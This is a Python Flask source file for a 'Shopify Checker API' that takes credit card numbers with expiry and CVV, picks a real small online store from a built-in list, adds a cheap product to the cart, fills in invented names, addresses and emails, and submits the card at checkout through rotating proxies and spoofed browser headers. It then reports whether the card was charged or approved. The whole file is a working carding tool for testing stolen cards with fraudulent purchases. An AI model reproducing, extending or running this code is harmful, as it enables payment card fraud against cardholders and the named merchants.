#!/usr/bin/env python3
import os
import re
import json
import time
import random
import logging
import threading
from urllib.parse import urlparse, urljoin

import requests
from flask import Flask, request, jsonify

# ─────────────────────────────────────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────────────────────────────────────
MAX_WORKERS = 10
REQUEST_TIMEOUT = 45

# Default sites to use if none provided
DEFAULT_SITES = [
    "violettestickers.com",
    "cjstickershop.com",
    "pipsticks.com",
    "stickerpickle.com",
    "parcelpaper.com",
]

app = Flask(__name__)
log = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

semaphore = threading.Semaphore(MAX_WORKERS)

# ─────────────────────────────────────────────────────────────────────────────
# UTILITY FUNCTIONS
# ─────────────────────────────────────────────────────────────────────────────

def rand_int(a, b):
    return random.randint(a, b)

def gen_ua():
    major = rand_int(120, 147)
    build = rand_int(5000, 6999)
    patch = rand_int(50, 249)
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{major}.0.{build}.{patch} Safari/537.36"

def gen_address():
    names = ["John", "Mike", "David", "James", "Robert", "William", "Richard", "Joseph"]
    first = random.choice(names)
    last = random.choice(["Smith", "Johnson", "Brown", "Taylor", "Wilson", "Davis"])
    street = random.choice(["Main St", "Park Ave", "Oak St", "Maple Dr", "Cedar Ln"])
    city = random.choice(["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia"])
    state = random.choice(["NY", "CA", "IL", "TX", "AZ", "PA"])
    zipcode = random.choice(["10001", "90210", "60601", "77001", "85001", "19101"])
    return {
        "first_name": first,
        "last_name": last,
        "address1": f"{rand_int(100, 9999)} {street}",
        "city": city,
        "province": state,
        "zip": zipcode,
        "country": "US",
        "phone": f"{rand_int(200, 999)}-{rand_int(200, 999)}-{rand_int(1000, 9999)}"
    }

def gen_email():
    names = ["alex", "john", "mike", "sara", "david", "emma", "james", "lisa", "chris", "anna"]
    return f"{random.choice(names)}{rand_int(100, 9999)}@gmail.com"

def get_brand(cc):
    if cc.startswith("4"):
        return "visa"
    if len(cc) >= 2:
        if cc[:2] in ("51","52","53","54","55"):
            return "mastercard"
        if cc[:2] in ("34","37"):
            return "amex"
    if cc.startswith("6011") or cc.startswith("65"):
        return "discover"
    return "unknown"

def luhn_valid(card):
    total = 0
    alt = False
    for d in reversed(card):
        n = int(d)
        if alt:
            n *= 2
            if n > 9:
                n -= 9
        total += n
        alt = not alt
    return total % 10 == 0

def truncate(s, max_len):
    return s[:max_len] if len(s) > max_len else s

def mask_proxy(proxy_url, status):
    if not proxy_url:
        return f"DIRECT [{status}]"
    parsed = urlparse(proxy_url)
    if parsed.hostname:
        return f"{parsed.scheme}://{parsed.hostname} [{status}]"
    return re.sub(r'//[^@]+@', '//***@', proxy_url) + f" [{status}]"

# ─────────────────────────────────────────────────────────────────────────────
# HTTP CLIENT
# ─────────────────────────────────────────────────────────────────────────────

def do_request(method, url, headers=None, data=None, json_data=None, proxy=None, timeout=REQUEST_TIMEOUT):
    session = requests.Session()
    session.verify = False
    proxies = {"http": proxy, "https": proxy} if proxy else None
    headers = headers or {}
    headers.setdefault("User-Agent", gen_ua())
    try:
        resp = session.request(method, url, headers=headers, data=data, json=json_data,
                               proxies=proxies, timeout=timeout, allow_redirects=False)
        return resp
    except Exception as e:
        raise

# ─────────────────────────────────────────────────────────────────────────────
# SHOPIFY CHECKER CORE (Enhanced with price extraction)
# ─────────────────────────────────────────────────────────────────────────────

def find_product_info(shop_url, session, under_price=None):
    """
    Finds the first product variant ID and its price.
    If under_price is set, it will keep searching until a product under that price is found.
    Returns (variant_id, price_in_usd) or (None, None)
    """
    resp = session.get(shop_url, timeout=30)
    if resp.status_code != 200:
        return None, None

    product_urls = re.findall(r'href="([^"]*\/products\/[^"]+)"', resp.text)
    if not product_urls:
        return None, None

    # Shuffle to avoid always hitting same product
    random.shuffle(product_urls)

    for product_url in product_urls:
        full_url = urljoin(shop_url, product_url)
        resp2 = session.get(full_url, timeout=30)
        if resp2.status_code != 200:
            continue

        # Try to find variant ID and price
        # Look for JSON data containing price
        price_match = re.search(r'"price":\s*"([0-9.]+)"', resp2.text)
        if not price_match:
            continue
        price = float(price_match.group(1))

        # If under_price is set and price > under_price, skip this product
        if under_price is not None and price > under_price:
            continue

        # Get variant ID
        variant_match = re.search(r'name="id"\s+value="(\d+)"', resp2.text)
        if variant_match:
            return variant_match.group(1), price
        # Alternative
        variant_match = re.search(r'"id":\s*(\d+),\s*"available"', resp2.text)
        if variant_match:
            return variant_match.group(1), price

    return None, None

def shopify_check(card, mm, yy, cvv, proxy_url, shop_url, under_price=None):
    """
    Full Shopify checkout flow.
    Returns: {status, message, proxy, proxy_status, price}
    """
    session = requests.Session()
    session.verify = False
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None

    try:
        # 1. Find a product variant (with optional price filter)
        variant_id, product_price = find_product_info(shop_url, session, under_price=under_price)
        if not variant_id:
            if under_price is not None:
                return {"status": "error", "message": f"No product under ${under_price} found", "proxy": proxy_url, "proxy_status": "LIVE", "price": None}
            else:
                return {"status": "error", "message": "No product variant found", "proxy": proxy_url, "proxy_status": "LIVE", "price": None}

        # 2. Add to cart
        add_url = urljoin(shop_url, "/cart/add.js")
        add_payload = {"id": variant_id, "quantity": 1}
        resp = session.post(add_url, json=add_payload, proxies=proxies, timeout=30)
        if resp.status_code not in (200, 201):
            return {"status": "error", "message": f"Add to cart failed: {resp.status_code}", "proxy": proxy_url, "proxy_status": "LIVE", "price": product_price}

        # 3. Get checkout token
        checkout_url = urljoin(shop_url, "/checkout")
        resp = session.get(checkout_url, proxies=proxies, timeout=30)
        if resp.status_code != 200:
            return {"status": "error", "message": f"Checkout page failed: {resp.status_code}", "proxy": proxy_url, "proxy_status": "LIVE", "price": product_price}

        token_match = re.search(r'/checkout/([a-zA-Z0-9]+)', resp.url)
        if not token_match:
            token_match = re.search(r'name="checkout_token"\s+value="([^"]+)"', resp.text)
        if not token_match:
            return {"status": "error", "message": "Checkout token not found", "proxy": proxy_url, "proxy_status": "LIVE", "price": product_price}
        token = token_match.group(1)

        # 4. Set address
        address = gen_address()
        address_payload = {
            "checkout[email]": gen_email(),
            "checkout[shipping_address][first_name]": address["first_name"],
            "checkout[shipping_address][last_name]": address["last_name"],
            "checkout[shipping_address][address1]": address["address1"],
            "checkout[shipping_address][city]": address["city"],
            "checkout[shipping_address][province]": address["province"],
            "checkout[shipping_address][zip]": address["zip"],
            "checkout[shipping_address][country]": address["country"],
            "checkout[shipping_address][phone]": address["phone"],
            "checkout[billing_address][first_name]": address["first_name"],
            "checkout[billing_address][last_name]": address["last_name"],
            "checkout[billing_address][address1]": address["address1"],
            "checkout[billing_address][city]": address["city"],
            "checkout[billing_address][province]": address["province"],
            "checkout[billing_address][zip]": address["zip"],
            "checkout[billing_address][country]": address["country"],
            "checkout[billing_address][phone]": address["phone"],
            "step": "contact_information",
        }
        address_url = urljoin(shop_url, f"/checkout/address/{token}")
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        resp = session.post(address_url, data=address_payload, headers=headers, proxies=proxies, timeout=30)
        if resp.status_code != 200:
            return {"status": "error", "message": f"Address step failed: {resp.status_code}", "proxy": proxy_url, "proxy_status": "LIVE", "price": product_price}

        # 5. Set shipping (default first rate)
        shipping_match = re.search(r'<input[^>]*name="checkout[shipping_rate_id]"[^>]*value="([^"]+)"', resp.text)
        if not shipping_match:
            shipping_match = re.search(r'data-shipping-rate-id="([^"]+)"', resp.text)
        if shipping_match:
            shipping_rate = shipping_match.group(1)
            shipping_payload = {
                "checkout[shipping_rate_id]": shipping_rate,
                "step": "shipping_method",
            }
            shipping_url = urljoin(shop_url, f"/checkout/shipping/{token}")
            resp = session.post(shipping_url, data=shipping_payload, headers=headers, proxies=proxies, timeout=30)
            if resp.status_code != 200:
                return {"status": "error", "message": f"Shipping step failed: {resp.status_code}", "proxy": proxy_url, "proxy_status": "LIVE", "price": product_price}

        # 6. Submit payment
        payment_match = re.search(r'<input[^>]*name="checkout[payment_gateway]"[^>]*value="([^"]+)"', resp.text)
        gateway = payment_match.group(1) if payment_match else "shopify_payments"

        expiry = f"{mm}/{yy[-2:]}"
        card_payload = {
            "checkout[payment_gateway]": gateway,
            "checkout[credit_card][number]": card,
            "checkout[credit_card][name]": address["first_name"] + " " + address["last_name"],
            "checkout[credit_card][expiry]": expiry,
            "checkout[credit_card][verification_value]": cvv,
            "step": "payment_method",
        }

        payment_url = urljoin(shop_url, f"/checkout/payment/{token}")
        resp = session.post(payment_url, data=card_payload, headers=headers, proxies=proxies, timeout=45, allow_redirects=False)

        # 7. Stricter response analysis
        if resp.status_code == 302:
            location = resp.headers.get("Location", "")
            if "/thank_you" in location or "/orders" in location:
                final_resp = session.get(location, proxies=proxies, timeout=30)
                if "order_number" in final_resp.text or "order #" in final_resp.text.lower():
                    return {"status": "charged", "message": "Order Confirmed", "proxy": proxy_url, "proxy_status": "LIVE", "price": product_price}
                else:
                    return {"status": "declined", "message": "Redirected to thank you, but no order number", "proxy": proxy_url, "proxy_status": "LIVE", "price": product_price}
            else:
                return {"status": "declined", "message": f"Redirected to {location}", "proxy": proxy_url, "proxy_status": "LIVE", "price": product_price}

        elif resp.status_code == 200:
            text = resp.text.lower()
            if "order_number" in text or "order #" in text:
                return {"status": "charged", "message": "Order Confirmed", "proxy": proxy_url, "proxy_status": "LIVE", "price": product_price}
            elif "thank_you" in text and "order" not in text:
                return {"status": "approved", "message": "Thank you page (order pending)", "proxy": proxy_url, "proxy_status": "LIVE", "price": product_price}
            else:
                return {"status": "declined", "message": "Card declined or generic error", "proxy": proxy_url, "proxy_status": "LIVE", "price": product_price}

        else:
            return {"status": "error", "message": f"Payment step HTTP {resp.status_code}", "proxy": proxy_url, "proxy_status": "LIVE", "price": product_price}

    except Exception as e:
        msg = truncate(str(e), 120)
        is_proxy_err = any(k in msg.lower() for k in ["connection refused", "timeout", "timed out", "proxy", "econnrefused", "econnreset"])
        proxy_status = "DEAD" if is_proxy_err else "LIVE"
        return {"status": "error", "message": msg, "proxy": proxy_url, "proxy_status": proxy_status, "price": None}

# ─────────────────────────────────────────────────────────────────────────────
# FLASK ROUTES
# ─────────────────────────────────────────────────────────────────────────────

@app.route('/shopify/check', methods=['GET'])
def handle_check_old():
    """Legacy endpoint – kept for backward compatibility"""
    try:
        cc = request.args.get('cc')
        proxy = request.args.get('proxy')
        site = request.args.get('site')
        if not cc or not site:
            return jsonify({"status": "error", "message": "Missing cc or site"}), 400

        parts = cc.split('|')
        if len(parts) != 4:
            return jsonify({"status": "error", "message": "Invalid cc format"}), 400
        card, mm, yy, cvv = parts
        if len(yy) == 2:
            yy = "20" + yy

        if not site.startswith("http"):
            site = "https://" + site

        result = shopify_check(card, mm, yy, cvv, proxy, site)
        return jsonify({
            "status": result.get("status"),
            "message": result.get("message"),
            "price": result.get("price")
        }), 200 if result.get("status") != "error" else 500
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/shopify/v1/check', methods=['GET'])
def handle_check_v1():
    """New endpoint – matches the desired behaviour"""
    start_time = time.time()
    try:
        cc = request.args.get('cc')
        proxy = request.args.get('proxy')
        site = request.args.get('site')
        under = request.args.get('under')

        # Parse under as float
        try:
            under_price = float(under) if under else None
        except:
            under_price = None

        # Validate cc
        if not cc:
            return jsonify({
                "Code": "",
                "Response": "Missing cc",
                "CC": cc,
                "Price": "N/A",
                "Gate": "Shopify Payments",
                "Site": site or "N/A",
                "Proxy": proxy or "Not Used",
                "Charged": "False",
                "Approved": "False",
                "Time": f"{time.time()-start_time:.1f}s"
            }), 400

        parts = cc.split('|')
        if len(parts) != 4:
            return jsonify({
                "Code": "",
                "Response": f"expected number|mm|yy|cvv — got {len(parts)} parts",
                "CC": cc,
                "Price": "N/A",
                "Gate": "Shopify Payments",
                "Site": site or "N/A",
                "Proxy": proxy or "Not Used",
                "Charged": "False",
                "Approved": "False",
                "Time": f"{time.time()-start_time:.1f}s"
            }), 400

        card, mm, yy, cvv = parts
        if len(yy) == 2:
            yy = "20" + yy

        # Use default site if none provided
        if not site:
            site = random.choice(DEFAULT_SITES)

        # Ensure https
        if not site.startswith("http"):
            site = "https://" + site

        # Acquire worker slot
        if not semaphore.acquire(blocking=False):
            return jsonify({
                "Code": "ERROR",
                "Response": "Server busy, try again later",
                "CC": cc,
                "Price": "N/A",
                "Gate": "Shopify Payments",
                "Site": site,
                "Proxy": proxy or "Not Used",
                "Charged": "False",
                "Approved": "False",
                "Time": f"{time.time()-start_time:.1f}s"
            }), 503

        try:
            result = shopify_check(card, mm, yy, cvv, proxy, site, under_price=under_price)
            elapsed = time.time() - start_time

            # Build response
            code = result.get("status", "ERROR").upper()
            if result.get("status") == "charged":
                charged = "True"
                approved = "False"
            elif result.get("status") == "approved":
                charged = "False"
                approved = "True"
            else:
                charged = "False"
                approved = "False"

            price_val = result.get("price")
            price_str = f"${price_val:.2f} USD" if price_val is not None else "N/A"

            response = {
                "Code": code,
                "Response": result.get("message", "Unknown"),
                "CC": cc,
                "Price": price_str,
                "Gate": "Shopify Payments",
                "Site": site,
                "Proxy": proxy or "Not Used",
                "Charged": charged,
                "Approved": approved,
                "Time": f"{elapsed:.1f}s"
            }
            http_code = 200 if result.get("status") not in ("error", "ERROR") else 500
            return jsonify(response), http_code
        finally:
            semaphore.release()

    except Exception as e:
        log.exception("Handler error")
        return jsonify({
            "Code": "ERROR",
            "Response": str(e)[:100],
            "CC": request.args.get('cc', 'N/A'),
            "Price": "N/A",
            "Gate": "Shopify Payments",
            "Site": request.args.get('site', 'N/A'),
            "Proxy": request.args.get('proxy', 'Not Used'),
            "Charged": "False",
            "Approved": "False",
            "Time": f"{time.time()-start_time:.1f}s"
        }), 500

# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    log.info("🔥 Shopify Checker API v1 (enhanced)")
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, threaded=True)
